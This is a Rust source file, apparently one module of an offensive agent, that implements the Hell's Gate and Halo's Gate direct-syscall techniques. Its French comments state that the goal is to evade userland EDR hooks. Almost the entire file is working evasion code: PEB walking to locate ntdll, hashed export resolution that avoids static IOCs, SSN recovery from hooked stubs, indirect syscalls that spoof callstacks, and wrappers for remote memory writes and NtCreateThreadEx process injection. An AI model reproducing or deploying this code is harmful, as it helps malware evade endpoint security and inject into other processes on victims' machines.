// inject/hellsgate.rs — Hell's Gate: Direct Syscalls via SSN Resolution
//
// ─────────────────────────────────────────────────────────────────────────────
// PROBLÈME : Les EDR (CrowdStrike, SentinelOne, Defender ATP) hookent les
// fonctions Nt* dans ntdll.dll en mode userland. Quand notre agent appelle
// NtAllocateVirtualMemory(), c'est en réalité le hook EDR qui est appelé
// en premier. L'EDR inspecte les arguments, log l'appel, puis décide si
// c'est suspect.
//
// SOLUTION : Hell's Gate
//   Au lieu d'appeler les fonctions ntdll (hookées), on résout les numéros
//   de syscall (SSN) directement depuis le binaire ntdll.dll en mémoire,
//   puis on effectue le syscall nous-mêmes avec l'instruction `syscall`.
//   L'EDR ne voit RIEN car on ne passe jamais par ses hooks.
//
// FLUX D'EXÉCUTION :
//   1. Trouver ntdll.dll via le PEB (Process Environment Block)
//   2. Parser le PE header de ntdll pour accéder à l'Export Directory
//   3. Pour chaque fonction Nt* dont on a besoin, lire le stub syscall :
//        mov r10, rcx         → 4C 8B D1
//        mov eax, <SSN>       → B8 XX XX 00 00  ← le SSN est ici
//        syscall              → 0F 05
//        ret                  → C3
//   4. Si on détecte un JMP (hook EDR) au lieu du pattern normal,
//      on utilise la technique "Halo's Gate" : chercher le SSN du voisin
//      et calculer le nôtre par offset (les SSN sont séquentiels).
//   5. Utiliser un stub assembleur pour exécuter le syscall directement.
//
// DÉTECTION DES HOOKS :
//   Stub syscall NORMAL (non hooké) :
//     4C 8B D1           mov r10, rcx
//     B8 XX XX 00 00     mov eax, SSN
//     0F 05              syscall
//     C3                 ret
//
//   Stub syscall HOOKÉ (EDR a inséré un JMP) :
//     E9 XX XX XX XX     jmp <hook_address>  ← HOOK DÉTECTÉ
//     ...
//
//   Quand un hook est détecté → Halo's Gate (regarder les voisins)
//
// RÉFÉRENCES :
//   - Hell's Gate (am0nsec & smelly__vx, 2020)
//   - Halo's Gate (sektor7, 2021) — fallback quand les stubs sont hookés
//   - Tartarus' Gate — variante qui gère les hooks multi-byte
// ─────────────────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
use std::ffi::CStr;

// ─────────────────────────────────────────────────────────────────────────────
// Structures PE parsing (nécessaires pour naviguer ntdll en mémoire)
// ─────────────────────────────────────────────────────────────────────────────

/// IMAGE_DOS_HEADER — premier header de tout PE
#[repr(C)]
#[cfg(target_os = "windows")]
struct ImageDosHeader {
    e_magic:    u16,       // "MZ" = 0x5A4D
    _pad:       [u16; 29],
    e_lfanew:   i32,       // Offset vers le PE header
}

/// IMAGE_NT_HEADERS64 — header principal du PE (x64)
#[repr(C)]
#[cfg(target_os = "windows")]
struct ImageNtHeaders64 {
    signature:       u32,                   // "PE\0\0" = 0x00004550
    file_header:     ImageFileHeader,
    optional_header: ImageOptionalHeader64,
}

#[repr(C)]
#[cfg(target_os = "windows")]
struct ImageFileHeader {
    machine:                 u16,
    number_of_sections:      u16,
    time_date_stamp:         u32,
    pointer_to_symbol_table: u32,
    number_of_symbols:       u32,
    size_of_optional_header: u16,
    characteristics:         u16,
}

#[repr(C)]
#[cfg(target_os = "windows")]
struct ImageOptionalHeader64 {
    magic:                        u16,
    _pad1:                        [u8; 14],   // skip to NumberOfRvaAndSizes offset
    size_of_image:                u32,
    _pad2:                        [u8; 84],   // skip to DataDirectory
    // On calcule l'offset manuellement pour les data directories
}

/// IMAGE_EXPORT_DIRECTORY — table des exports
#[repr(C)]
#[cfg(target_os = "windows")]
struct ImageExportDirectory {
    characteristics:        u32,
    time_date_stamp:        u32,
    major_version:          u16,
    minor_version:          u16,
    name:                   u32,    // RVA du nom du module
    base:                   u32,    // Ordinal base
    number_of_functions:    u32,
    number_of_names:        u32,
    address_of_functions:   u32,    // RVA vers tableau d'adresses
    address_of_names:       u32,    // RVA vers tableau de noms
    address_of_name_ordinals: u32,  // RVA vers tableau d'ordinals
}

/// DATA_DIRECTORY — pointeur vers une section du PE
#[repr(C)]
#[cfg(target_os = "windows")]
#[derive(Clone, Copy)]
struct ImageDataDirectory {
    virtual_address: u32,
    size:            u32,
}

// ─────────────────────────────────────────────────────────────────────────────
// Syscall Table — stocke les SSN résolus
// ─────────────────────────────────────────────────────────────────────────────

/// SyscallEntry — un syscall résolu avec son numéro et son adresse
#[derive(Debug, Clone, Copy)]
pub struct SyscallEntry {
    /// Numéro du syscall (System Service Number)
    pub ssn: u16,
    /// Adresse de l'instruction `syscall` dans ntdll (pour indirect syscall)
    pub syscall_addr: usize,
    /// Hash du nom de la fonction (pour lookup rapide sans strings)
    pub hash: u32,
}

/// SyscallTable — table des syscalls résolus dynamiquement
pub struct SyscallTable {
    pub nt_allocate_virtual_memory:  Option<SyscallEntry>,
    pub nt_protect_virtual_memory:   Option<SyscallEntry>,
    pub nt_write_virtual_memory:     Option<SyscallEntry>,
    pub nt_create_thread_ex:         Option<SyscallEntry>,
    pub nt_open_process:             Option<SyscallEntry>,
    pub nt_close:                    Option<SyscallEntry>,
    pub nt_query_information_process: Option<SyscallEntry>,
    pub nt_read_virtual_memory:      Option<SyscallEntry>,
    pub nt_resume_thread:            Option<SyscallEntry>,
    pub nt_wait_for_single_object:   Option<SyscallEntry>,
    pub nt_queue_apc_thread:         Option<SyscallEntry>,
    pub nt_map_view_of_section:      Option<SyscallEntry>,
    pub nt_create_section:           Option<SyscallEntry>,
    pub nt_unmap_view_of_section:    Option<SyscallEntry>,
}

impl SyscallTable {
    /// new — initialise la table avec des valeurs vides
    pub fn new() -> Self {
        SyscallTable {
            nt_allocate_virtual_memory:   None,
            nt_protect_virtual_memory:    None,
            nt_write_virtual_memory:      None,
            nt_create_thread_ex:          None,
            nt_open_process:              None,
            nt_close:                     None,
            nt_query_information_process: None,
            nt_read_virtual_memory:       None,
            nt_resume_thread:             None,
            nt_wait_for_single_object:    None,
            nt_queue_apc_thread:          None,
            nt_map_view_of_section:       None,
            nt_create_section:            None,
            nt_unmap_view_of_section:     None,
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Hashing — DJB2 hash pour résoudre les fonctions sans strings en clair
// ─────────────────────────────────────────────────────────────────────────────

/// djb2_hash — hash rapide d'un nom de fonction
/// Permet de chercher les fonctions sans avoir leurs noms en clair dans le binaire
/// (les noms de fonctions ntdll sont des IOC pour les EDR en analyse statique)
pub const fn djb2_hash(input: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    let mut i = 0;
    while i < input.len() {
        hash = hash.wrapping_mul(33).wrapping_add(input[i] as u32);
        i += 1;
    }
    hash
}

// Hashes pré-calculés des fonctions ntdll qu'on veut résoudre
// Calculés avec djb2_hash(b"NtAllocateVirtualMemory") etc.
pub const HASH_NT_ALLOCATE_VIRTUAL_MEMORY:   u32 = djb2_hash(b"NtAllocateVirtualMemory");
pub const HASH_NT_PROTECT_VIRTUAL_MEMORY:    u32 = djb2_hash(b"NtProtectVirtualMemory");
pub const HASH_NT_WRITE_VIRTUAL_MEMORY:      u32 = djb2_hash(b"NtWriteVirtualMemory");
pub const HASH_NT_CREATE_THREAD_EX:          u32 = djb2_hash(b"NtCreateThreadEx");
pub const HASH_NT_OPEN_PROCESS:              u32 = djb2_hash(b"NtOpenProcess");
pub const HASH_NT_CLOSE:                     u32 = djb2_hash(b"NtClose");
pub const HASH_NT_QUERY_INFORMATION_PROCESS: u32 = djb2_hash(b"NtQueryInformationProcess");
pub const HASH_NT_READ_VIRTUAL_MEMORY:       u32 = djb2_hash(b"NtReadVirtualMemory");
pub const HASH_NT_RESUME_THREAD:             u32 = djb2_hash(b"NtResumeThread");
pub const HASH_NT_WAIT_FOR_SINGLE_OBJECT:    u32 = djb2_hash(b"NtWaitForSingleObject");
pub const HASH_NT_QUEUE_APC_THREAD:          u32 = djb2_hash(b"NtQueueApcThread");
pub const HASH_NT_MAP_VIEW_OF_SECTION:       u32 = djb2_hash(b"NtMapViewOfSection");
pub const HASH_NT_CREATE_SECTION:            u32 = djb2_hash(b"NtCreateSection");
pub const HASH_NT_UNMAP_VIEW_OF_SECTION:     u32 = djb2_hash(b"NtUnmapViewOfSection");

// ─────────────────────────────────────────────────────────────────────────────
// Hell's Gate — Résolution des SSN
// ─────────────────────────────────────────────────────────────────────────────

/// get_ntdll_base — trouve l'adresse de base de ntdll.dll via le PEB
///
/// Technique : on parcourt la liste InMemoryOrderModuleList du PEB.
/// ntdll.dll est TOUJOURS le 2ème module chargé (après l'exe principal).
///
/// Structure : TEB → PEB → Ldr → InMemoryOrderModuleList → ntdll
///
/// Avantage : aucun appel API (pas de GetModuleHandle qui peut être hooké)
#[cfg(target_os = "windows")]
pub unsafe fn get_ntdll_base() -> Option<*const u8> {
    // Lire le PEB depuis le TEB (Thread Environment Block)
    // Sur x64 : TEB est à GS:[0x60] → PEB
    // PEB + 0x18 = Ldr (PEB_LDR_DATA)
    // Ldr + 0x20 = InMemoryOrderModuleList (LIST_ENTRY)

    let peb: *const u8;

    #[cfg(target_arch = "x86_64")]
    {
        // GS:[0x60] = PEB sur x64
        core::arch::asm!(
            "mov {}, gs:[0x60]",
            out(reg) peb,
            options(nostack, nomem, preserves_flags)
        );
    }

    #[cfg(target_arch = "x86")]
    {
        // FS:[0x30] = PEB sur x86
        core::arch::asm!(
            "mov {}, fs:[0x30]",
            out(reg) peb,
            options(nostack, nomem, preserves_flags)
        );
    }

    if peb.is_null() {
        return None;
    }

    // PEB + 0x18 → PEB_LDR_DATA*
    let ldr = *(peb.add(0x18) as *const *const u8);
    if ldr.is_null() {
        return None;
    }

    // Ldr + 0x20 → InMemoryOrderModuleList (LIST_ENTRY head)
    let module_list_head = ldr.add(0x20) as *const *const u8;
    let mut current = *(module_list_head) as *const u8;

    // Le head pointe vers le premier module (l'exe),
    // le .Flink du premier module pointe vers ntdll
    // On itère pour trouver ntdll (2ème entrée)

    // InMemoryOrderModuleList est une LIST_ENTRY :
    //   +0x00 Flink
    //   +0x08 Blink (x64) / +0x04 Blink (x32)
    // LDR_DATA_TABLE_ENTRY (relative to InMemoryOrderLinks):
    //   +0x30 DllBase (x64) / +0x18 DllBase (x86)
    //   +0x58 BaseDllName (UNICODE_STRING) (x64)

    // Parcourir les modules chargés
    let head = module_list_head as *const u8;
    let mut count = 0u32;

    loop {
        if current.is_null() || current == head {
            return None;
        }

        // DllBase est à l'offset +0x30 de la LDR_DATA_TABLE_ENTRY
        // (en fait +0x20 depuis InMemoryOrderLinks sur x64 car
        //  InMemoryOrderLinks est à offset +0x10 de la structure)
        let dll_base = *(current.add(0x20) as *const *const u8);

        // BaseDllName (UNICODE_STRING) à offset +0x48 depuis InMemoryOrderLinks
        // UNICODE_STRING: Length (u16) + MaxLength (u16) + pad + Buffer (ptr)
        let name_len = *(current.add(0x48) as *const u16);
        let name_buf = *(current.add(0x50) as *const *const u16);

        if !dll_base.is_null() && !name_buf.is_null() && name_len > 0 {
            // Lire le nom du module en UTF-16
            let name_slice = core::slice::from_raw_parts(
                name_buf,
                (name_len / 2) as usize,
            );

            // Vérifier si c'est ntdll.dll (case-insensitive)
            if is_ntdll_name(name_slice) {
                return Some(dll_base);
            }
        }

        // Suivre le Flink (premier champ de LIST_ENTRY)
        current = *(current as *const *const u8);
        count += 1;

        // Protection contre les boucles infinies
        if count > 256 {
            return None;
        }
    }
}

/// is_ntdll_name — vérifie si un nom UTF-16 est "ntdll.dll" (case-insensitive)
#[cfg(target_os = "windows")]
fn is_ntdll_name(name: &[u16]) -> bool {
    const NTDLL: &[u16] = &[
        b'n' as u16, b't' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
        b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
    ];

    if name.len() < NTDLL.len() {
        return false;
    }

    for (i, &expected) in NTDLL.iter().enumerate() {
        let c = name[i];
        // Case-insensitive comparison
        let lower = if c >= b'A' as u16 && c <= b'Z' as u16 {
            c + 32
        } else {
            c
        };
        if lower != expected {
            return false;
        }
    }
    true
}

/// parse_exports — parse la table des exports de ntdll pour trouver les fonctions Nt*
///
/// Retourne un Vec de (hash_du_nom, adresse_de_la_fonction) pour toutes les
/// fonctions dont le nom commence par "Nt" (et pas "Ntdll" — qui sont des helpers)
#[cfg(target_os = "windows")]
pub unsafe fn parse_exports(ntdll_base: *const u8) -> Vec<(u32, *const u8)> {
    let mut exports = Vec::new();

    // 1. Vérifier le magic MZ
    let dos_header = ntdll_base as *const ImageDosHeader;
    if (*dos_header).e_magic != 0x5A4D {
        return exports;
    }

    // 2. Aller au NT Header
    let nt_headers = ntdll_base.add((*dos_header).e_lfanew as usize)
        as *const ImageNtHeaders64;
    if (*nt_headers).signature != 0x00004550 {
        return exports;
    }

    // 3. Trouver l'Export Directory (DataDirectory[0])
    // OptionalHeader commence après FileHeader
    // DataDirectory est à l'offset 112 (0x70) dans OptionalHeader64
    let optional_header_ptr = &(*nt_headers).optional_header as *const _ as *const u8;
    let data_dir_ptr = optional_header_ptr.add(112) as *const ImageDataDirectory;

    // DataDirectory[0] = Export Directory
    let export_dir_rva = (*data_dir_ptr).virtual_address;
    if export_dir_rva == 0 {
        return exports;
    }

    let export_dir = ntdll_base.add(export_dir_rva as usize) as *const ImageExportDirectory;

    let num_names = (*export_dir).number_of_names;
    let names_rva = ntdll_base.add((*export_dir).address_of_names as usize) as *const u32;
    let funcs_rva = ntdll_base.add((*export_dir).address_of_functions as usize) as *const u32;
    let ords_rva  = ntdll_base.add((*export_dir).address_of_name_ordinals as usize) as *const u16;

    // 4. Itérer toutes les fonctions exportées
    for i in 0..num_names {
        let name_rva = *names_rva.add(i as usize);
        let name_ptr = ntdll_base.add(name_rva as usize) as *const i8;
        let name = CStr::from_ptr(name_ptr);
        let name_bytes = name.to_bytes();

        // On ne veut que les fonctions Nt* (pas Rtl*, Ldr*, etc.)
        // Et pas NtdllXxx qui sont des helpers internes
        if name_bytes.len() > 2
            && name_bytes[0] == b'N'
            && name_bytes[1] == b't'
            && !(name_bytes.len() > 5
                && name_bytes[2] == b'd'
                && name_bytes[3] == b'l'
                && name_bytes[4] == b'l')
        {
            let ordinal = *ords_rva.add(i as usize);
            let func_rva = *funcs_rva.add(ordinal as usize);
            let func_addr = ntdll_base.add(func_rva as usize);
            let hash = djb2_hash(name_bytes);

            exports.push((hash, func_addr));
        }
    }

    exports
}

/// extract_ssn — extrait le SSN depuis le stub syscall d'une fonction Nt*
///
/// Pattern normal (non hooké) :
///   4C 8B D1          mov r10, rcx
///   B8 XX XX 00 00    mov eax, <SSN>    ← on veut ces 2 bytes (little-endian)
///
/// Si le pattern ne correspond pas → la fonction est hookée par un EDR.
/// Dans ce cas, on retourne None et on utilisera Halo's Gate.
#[cfg(target_os = "windows")]
pub unsafe fn extract_ssn(func_addr: *const u8) -> Option<u16> {
    // Vérifier le pattern du stub syscall
    // Byte 0-2 : 4C 8B D1 (mov r10, rcx)
    // Byte 3   : B8        (mov eax, imm32)
    // Byte 4-5 : SSN (little-endian, u16)
    // Byte 6-7 : 00 00     (high bytes du imm32)

    let b0 = *func_addr.add(0);
    let b1 = *func_addr.add(1);
    let b2 = *func_addr.add(2);
    let b3 = *func_addr.add(3);

    // Pattern 1 : stub syscall standard (Windows 10/11)
    if b0 == 0x4C && b1 == 0x8B && b2 == 0xD1 && b3 == 0xB8 {
        let ssn_low  = *func_addr.add(4) as u16;
        let ssn_high = *func_addr.add(5) as u16;
        let ssn = ssn_low | (ssn_high << 8);

        // Vérifier que les high bytes sont 0 (sanity check)
        if *func_addr.add(6) == 0x00 && *func_addr.add(7) == 0x00 {
            return Some(ssn);
        }
    }

    // Pattern 2 : variante Windows (certaines builds)
    // Le mov eax peut être à offset +1 si un NOP est inséré
    if b0 == 0x4C && b1 == 0x8B && b2 == 0xD1 {
        // Chercher B8 dans les 8 premiers bytes
        for offset in 3..8usize {
            if *func_addr.add(offset) == 0xB8 {
                let ssn_low  = *func_addr.add(offset + 1) as u16;
                let ssn_high = *func_addr.add(offset + 2) as u16;
                return Some(ssn_low | (ssn_high << 8));
            }
        }
    }

    // Hook détecté (JMP, ou pattern inconnu)
    None
}

/// find_syscall_instruction — trouve l'adresse de l'instruction `syscall` (0F 05)
/// dans le stub de la fonction.
///
/// Pour la technique "indirect syscall" : on exécute notre propre stub mais
/// on fait le `syscall` depuis l'adresse légitime de ntdll pour que la
/// return address sur la stack pointe vers ntdll (et pas vers notre code).
/// Les EDR qui vérifient la callstack (stack spoofing detection) sont ainsi trompés.
#[cfg(target_os = "windows")]
pub unsafe fn find_syscall_instruction(func_addr: *const u8) -> Option<usize> {
    // Chercher 0F 05 (syscall) dans les 32 premiers bytes
    for i in 0..32usize {
        if *func_addr.add(i) == 0x0F && *func_addr.add(i + 1) == 0x05 {
            return Some(func_addr.add(i) as usize);
        }
    }
    None
}

/// halos_gate — Halo's Gate : résoudre un SSN quand le stub est hooké
///
/// Principe : les SSN sont séquentiels dans ntdll.
/// Si NtAllocateVirtualMemory est hookée mais que la fonction juste avant
/// ou juste après ne l'est pas, on peut calculer notre SSN :
///   SSN(target) = SSN(voisin) ± offset
///
/// On cherche en "spirale" : +1, -1, +2, -2, +3, -3, ...
/// jusqu'à trouver un voisin non hooké.
#[cfg(target_os = "windows")]
pub unsafe fn halos_gate(func_addr: *const u8) -> Option<u16> {
    // Taille approximative d'un stub syscall (32 bytes en moyenne)
    const STUB_SIZE: usize = 32;

    // Chercher dans les 500 voisins (ça suffit largement)
    for distance in 1..500i32 {
        // Chercher vers le haut
        let up_addr = func_addr.sub((distance as usize) * STUB_SIZE);
        if let Some(ssn) = extract_ssn(up_addr) {
            return Some(ssn.wrapping_add(distance as u16));
        }

        // Chercher vers le bas
        let down_addr = func_addr.add((distance as usize) * STUB_SIZE);
        if let Some(ssn) = extract_ssn(down_addr) {
            return Some(ssn.wrapping_sub(distance as u16));
        }
    }

    None
}

// ─────────────────────────────────────────────────────────────────────────────
// Résolution complète de la Syscall Table
// ─────────────────────────────────────────────────────────────────────────────

/// resolve_syscall_table — résout tous les SSN nécessaires via Hell's Gate
///
/// C'est la fonction principale. Elle :
///   1. Trouve ntdll.dll en mémoire via le PEB
///   2. Parse ses exports
///   3. Pour chaque fonction cible, extrait le SSN (Hell's Gate)
///   4. Si hookée, utilise Halo's Gate (résolution par voisinage)
///   5. Retourne la table complète prête à l'emploi
#[cfg(target_os = "windows")]
pub unsafe fn resolve_syscall_table() -> Result<SyscallTable, String> {
    // 1. Trouver ntdll
    let ntdll_base = get_ntdll_base()
        .ok_or("Failed to locate ntdll.dll via PEB")?;

    // 2. Parser les exports
    let exports = parse_exports(ntdll_base);
    if exports.is_empty() {
        return Err("Failed to parse ntdll exports".into());
    }

    // 3. Construire la table
    let mut table = SyscallTable::new();

    // Liste des fonctions à résoudre : (hash, setter)
    let targets: &[(u32, &dyn Fn(&mut SyscallTable, SyscallEntry))] = &[
        (HASH_NT_ALLOCATE_VIRTUAL_MEMORY,   &|t, e| t.nt_allocate_virtual_memory = Some(e)),
        (HASH_NT_PROTECT_VIRTUAL_MEMORY,    &|t, e| t.nt_protect_virtual_memory = Some(e)),
        (HASH_NT_WRITE_VIRTUAL_MEMORY,      &|t, e| t.nt_write_virtual_memory = Some(e)),
        (HASH_NT_CREATE_THREAD_EX,          &|t, e| t.nt_create_thread_ex = Some(e)),
        (HASH_NT_OPEN_PROCESS,              &|t, e| t.nt_open_process = Some(e)),
        (HASH_NT_CLOSE,                     &|t, e| t.nt_close = Some(e)),
        (HASH_NT_QUERY_INFORMATION_PROCESS, &|t, e| t.nt_query_information_process = Some(e)),
        (HASH_NT_READ_VIRTUAL_MEMORY,       &|t, e| t.nt_read_virtual_memory = Some(e)),
        (HASH_NT_RESUME_THREAD,             &|t, e| t.nt_resume_thread = Some(e)),
        (HASH_NT_WAIT_FOR_SINGLE_OBJECT,    &|t, e| t.nt_wait_for_single_object = Some(e)),
        (HASH_NT_QUEUE_APC_THREAD,          &|t, e| t.nt_queue_apc_thread = Some(e)),
        (HASH_NT_MAP_VIEW_OF_SECTION,       &|t, e| t.nt_map_view_of_section = Some(e)),
        (HASH_NT_CREATE_SECTION,            &|t, e| t.nt_create_section = Some(e)),
        (HASH_NT_UNMAP_VIEW_OF_SECTION,     &|t, e| t.nt_unmap_view_of_section = Some(e)),
    ];

    for &(hash, setter) in targets {
        // Trouver la fonction dans les exports
        if let Some(&(_, func_addr)) = exports.iter().find(|&&(h, _)| h == hash) {
            // Essayer Hell's Gate (extraction directe)
            let ssn = match extract_ssn(func_addr) {
                Some(ssn) => ssn,
                None => {
                    // Hook détecté → Halo's Gate (résolution par voisinage)
                    match halos_gate(func_addr) {
                        Some(ssn) => ssn,
                        None => continue, // Impossible de résoudre — skip
                    }
                }
            };

            // Trouver l'instruction syscall pour indirect syscall
            let syscall_addr = find_syscall_instruction(func_addr)
                .unwrap_or(0);

            let entry = SyscallEntry {
                ssn,
                syscall_addr,
                hash,
            };

            setter(&mut table, entry);
        }
    }

    Ok(table)
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn resolve_syscall_table() -> Result<SyscallTable, String> {
    Err("Hell's Gate: Windows x64 only".into())
}

// ─────────────────────────────────────────────────────────────────────────────
// Exécution des syscalls directs — stubs assembleur x64
// ─────────────────────────────────────────────────────────────────────────────
//
// Convention d'appel Windows x64 (syscall) :
//   - RAX = numéro du syscall (SSN)
//   - R10 = premier argument (copié depuis RCX par le stub)
//   - RCX, RDX, R8, R9 = arguments 1-4 (convention Windows x64)
//   - Stack  = arguments 5+ (avec shadow space de 32 bytes)
//
// Le stub fait :
//   mov r10, rcx     → copie arg1 dans r10 (convention syscall NT)
//   mov eax, SSN     → charge le numéro du syscall
//   syscall          → effectue la transition kernel
//   ret              → retour à l'appelant

/// do_syscall — exécute un syscall direct (jusqu'à 4 arguments)
///
/// C'est le coeur de Hell's Gate : on bypass complètement ntdll.dll
/// et on fait le syscall nous-mêmes.
///
/// IMPORTANT: Cette version utilise un syscall DIRECT.
/// Pour les EDR qui vérifient la return address (callstack),
/// utiliser `do_indirect_syscall` qui exécute le `syscall` depuis
/// une adresse dans ntdll (mais avec notre SSN).
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn do_syscall(
    ssn: u16,
    arg1: usize,
    arg2: usize,
    arg3: usize,
    arg4: usize,
) -> i32 {
    let status: i32;
    core::arch::asm!(
        "mov r10, rcx",       // Convention NT : r10 = 1er argument
        "mov eax, {ssn:e}",   // SSN dans eax
        "syscall",            // Transition vers le kernel
        ssn = in(reg) ssn as u32,
        in("rcx") arg1,
        in("rdx") arg2,
        in("r8") arg3,
        in("r9") arg4,
        lateout("rax") status,
        // Clobbers (le syscall peut modifier ces registres)
        out("r10") _,
        out("r11") _,
        options(nostack),
    );
    status
}

/// do_indirect_syscall — exécute un syscall INDIRECT (via adresse ntdll)
///
/// Technique améliorée : au lieu d'exécuter l'instruction `syscall`
/// dans notre propre code (qui serait détecté par callstack analysis),
/// on saute vers l'adresse de l'instruction `syscall` dans ntdll.dll.
///
/// Résultat : la return address sur la stack pointe vers ntdll.dll → légitime
/// L'EDR qui fait du callstack walking voit :
///   ntdll!NtAllocateVirtualMemory+0x14 → syscall
/// au lieu de :
///   agent.exe!unknown+0x??? → syscall ← SUSPECT
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn do_indirect_syscall(
    entry: &SyscallEntry,
    arg1: usize,
    arg2: usize,
    arg3: usize,
    arg4: usize,
) -> i32 {
    if entry.syscall_addr == 0 {
        // Fallback sur syscall direct si on n'a pas trouvé l'adresse
        return do_syscall(entry.ssn, arg1, arg2, arg3, arg4);
    }

    let status: i32;
    let syscall_addr = entry.syscall_addr;

    core::arch::asm!(
        "mov r10, rcx",        // Convention NT : r10 = 1er argument
        "mov eax, {ssn:e}",    // SSN dans eax
        "call {addr}",         // Call vers `syscall; ret` dans ntdll (call permet le retour pour ne pas crasher)
        ssn = in(reg) entry.ssn as u32,
        addr = in(reg) syscall_addr,
        in("rcx") arg1,
        in("rdx") arg2,
        in("r8") arg3,
        in("r9") arg4,
        lateout("rax") status,
        out("r10") _,
        out("r11") _,
        options(nostack),
    );
    status
}

// ─────────────────────────────────────────────────────────────────────────────
// Wrappers typés — Interface haut niveau pour les opérations courantes
// ─────────────────────────────────────────────────────────────────────────────
// Ces fonctions wrappent do_indirect_syscall avec les bons types et arguments,
// remplaçant les appels classiques à ntdll (qui seraient hookés par l'EDR).

/// NTSTATUS codes
pub const STATUS_SUCCESS: i32 = 0;

/// nt_alloc — NtAllocateVirtualMemory via direct syscall
///
/// Remplace VirtualAllocEx() — alloue de la mémoire dans un processus
/// Sans passer par les hooks EDR de ntdll!NtAllocateVirtualMemory
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn nt_alloc(
    table: &SyscallTable,
    process_handle: isize,
    base_address: *mut *mut core::ffi::c_void,
    zero_bits: usize,
    region_size: *mut usize,
    alloc_type: u32,
    protect: u32,
) -> i32 {
    let entry = table.nt_allocate_virtual_memory
        .as_ref()
        .ok_or("NtAllocateVirtualMemory not resolved")
        .unwrap();

    // NtAllocateVirtualMemory a 6 arguments → 4 en registres + 2 sur la stack
    // On doit préparer la stack manuellement pour les args 5 et 6
    let status: i32;
    core::arch::asm!(
        // Préparer le shadow space + arguments stack
        "sub rsp, 0x38",           // 0x20 shadow + 0x10 pour args 5-6 + 0x08 align
        "mov [rsp+0x28], {alloc_type:r}",  // 5ème argument
        "mov [rsp+0x30], {protect:r}",     // 6ème argument
        "mov r10, rcx",            // Convention NT
        "mov eax, {ssn:e}",        // SSN
        "syscall",                 // Direct syscall
        "add rsp, 0x38",          // Restaurer la stack
        ssn = in(reg) entry.ssn as u32,
        in("rcx") process_handle as usize,
        in("rdx") base_address as usize,
        in("r8") zero_bits,
        in("r9") region_size as usize,
        alloc_type = in(reg) alloc_type as usize,
        protect = in(reg) protect as usize,
        lateout("rax") status,
        out("r10") _,
        out("r11") _,
    );
    status
}

/// nt_protect — NtProtectVirtualMemory via direct syscall
///
/// Remplace VirtualProtectEx() — change les permissions mémoire
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn nt_protect(
    table: &SyscallTable,
    process_handle: isize,
    base_address: *mut *mut core::ffi::c_void,
    region_size: *mut usize,
    new_protect: u32,
    old_protect: *mut u32,
) -> i32 {
    let entry = table.nt_protect_virtual_memory
        .as_ref()
        .ok_or("NtProtectVirtualMemory not resolved")
        .unwrap();

    let status: i32;
    core::arch::asm!(
        "sub rsp, 0x38",
        "mov [rsp+0x28], {old_protect:r}",
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "syscall",
        "add rsp, 0x38",
        ssn = in(reg) entry.ssn as u32,
        in("rcx") process_handle as usize,
        in("rdx") base_address as usize,
        in("r8") region_size as usize,
        in("r9") new_protect as usize,
        old_protect = in(reg) old_protect as usize,
        lateout("rax") status,
        out("r10") _,
        out("r11") _,
    );
    status
}

/// nt_write — NtWriteVirtualMemory via direct syscall
///
/// Remplace WriteProcessMemory() — écrit dans la mémoire d'un processus
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn nt_write(
    table: &SyscallTable,
    process_handle: isize,
    base_address: *mut core::ffi::c_void,
    buffer: *const core::ffi::c_void,
    size: usize,
    bytes_written: *mut usize,
) -> i32 {
    let entry = table.nt_write_virtual_memory
        .as_ref()
        .ok_or("NtWriteVirtualMemory not resolved")
        .unwrap();

    let status: i32;
    core::arch::asm!(
        "sub rsp, 0x38",
        "mov [rsp+0x28], {bytes_written:r}",
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "syscall",
        "add rsp, 0x38",
        ssn = in(reg) entry.ssn as u32,
        in("rcx") process_handle as usize,
        in("rdx") base_address as usize,
        in("r8") buffer as usize,
        in("r9") size,
        bytes_written = in(reg) bytes_written as usize,
        lateout("rax") status,
        out("r10") _,
        out("r11") _,
    );
    status
}

/// nt_create_thread — NtCreateThreadEx via direct syscall
///
/// Remplace CreateRemoteThread() — crée un thread dans un processus distant
/// C'est l'appel le plus sensible car CreateRemoteThread est l'IOC #1 des EDR
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn nt_create_thread(
    table: &SyscallTable,
    thread_handle: *mut isize,
    access_mask: u32,
    object_attributes: usize, // NULL
    process_handle: isize,
    start_address: *const core::ffi::c_void,
    argument: *const core::ffi::c_void,
    create_flags: u32,
    zero_bits: usize,
    stack_size: usize,
    max_stack_size: usize,
    attribute_list: usize, // NULL
) -> i32 {
    let entry = table.nt_create_thread_ex
        .as_ref()
        .ok_or("NtCreateThreadEx not resolved")
        .unwrap();

    // 11 arguments — 4 registres + 7 sur la stack
    let status: i32;
    core::arch::asm!(
        "sub rsp, 0x68",                              // Shadow + 7 stack args + align
        "mov [rsp+0x28], {start_addr:r}",             // arg 5
        "mov [rsp+0x30], {argument:r}",               // arg 6
        "mov [rsp+0x38], {create_flags:r}",           // arg 7
        "mov [rsp+0x40], {zero_bits:r}",              // arg 8
        "mov [rsp+0x48], {stack_size:r}",             // arg 9
        "mov [rsp+0x50], {max_stack_size:r}",         // arg 10
        "mov [rsp+0x58], {attr_list:r}",              // arg 11
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "syscall",
        "add rsp, 0x68",
        ssn = in(reg) entry.ssn as u32,
        in("rcx") thread_handle as usize,             // arg 1
        in("rdx") access_mask as usize,               // arg 2
        in("r8") object_attributes,                   // arg 3
        in("r9") process_handle as usize,             // arg 4
        start_addr = in(reg) start_address as usize,
        argument = in(reg) argument as usize,
        create_flags = in(reg) create_flags as usize,
        zero_bits = in(reg) zero_bits,
        stack_size = in(reg) stack_size,
        max_stack_size = in(reg) max_stack_size,
        attr_list = in(reg) attribute_list,
        lateout("rax") status,
        out("r10") _,
        out("r11") _,
    );
    status
}

